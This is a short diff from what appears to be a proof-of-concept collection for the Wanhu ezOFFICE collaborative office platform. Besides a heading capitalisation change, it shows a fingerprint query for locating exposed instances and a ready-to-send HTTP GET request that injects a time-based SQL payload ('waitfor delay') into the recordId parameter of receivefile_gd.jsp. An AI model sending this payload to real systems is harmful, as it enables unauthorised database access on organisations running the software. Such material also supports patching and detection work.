@@ -8,7 +8,7 @@
 app="万户ezOFFICE协同管理平台"
 ```
 
-## poc
+## POC
 
 ```
 GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+'0:0:5'--+- HTTP/1.1
